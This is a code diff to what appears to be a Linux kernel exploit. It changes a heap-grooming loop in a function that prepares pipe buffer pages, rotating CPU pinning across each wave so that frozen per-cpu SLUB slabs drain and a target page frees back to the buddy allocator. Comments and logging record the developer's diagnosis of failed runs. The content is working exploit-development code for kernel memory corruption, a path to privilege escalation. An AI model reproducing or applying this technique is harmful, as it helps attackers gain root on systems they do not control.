@@ -432,7 +432,22 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   if (flat_env && flat_env[0])
     flat_max = atoi(flat_env);
   int sc_flat = 0;
+  /* Rotate the sweep across every online CPU (deterministic owned=0 fix).
+   * Each wave's clone allocates its mm_struct on the CPU this thread is
+   * pinned to (copy_process runs inline in the syscall), so pinning the
+   * whole loop to CORE only ever drained CPU0's per-cpu freelist.  A
+   * target page frozen on another CPU's cpu slab (diagnosis: inuse=0
+   * frozen=1, sc identical across 24 waves x 12 rounds, owned=0 every
+   * round) never moved -- deterministic failure, not SLUB luck.  Rotating
+   * forces each cpu slab to be drained/rotated until the target page
+   * unfreezes back to the buddy (read_target_slab_cache -> 0).
+   * clone_child's own pin_to_core(CORE) runs after the alloc, so it does
+   * not undo this. */
+  int wave_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  if (wave_ncpu < 1)
+    wave_ncpu = 1;
   for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
+    pin_to_core((size_t)(w % wave_ncpu));
     tsc = read_target_slab_cache(conv_fd, base);
     if (tsc == 0 && taken_wave >= 0) {
       target_owned = 1;
@@ -444,8 +459,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     }
     waves_used = w + 1;
     uint64_t sc2 = read_target_slab_cache(conv_fd, base);
-    pr_info("pipe convert wave[%d] n=%zu sc=%016llx\n", w, wave_n,
-            (unsigned long long)sc2);
+    pr_info("pipe convert wave[%d] n=%zu sc=%016llx cpu=%d\n", w, wave_n,
+            (unsigned long long)sc2, w % wave_ncpu);
     if (sc2 != 0) {
       /*
        * The wave now owns the page (it flipped out of the buddy), or it was
@@ -471,6 +486,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       sc_flat = 0;
     }
   }
+  pin_to_core(CORE);
   if (!target_owned && taken_wave >= 0 &&
       read_target_slab_cache(conv_fd, base) == 0) {
     target_owned = 1;
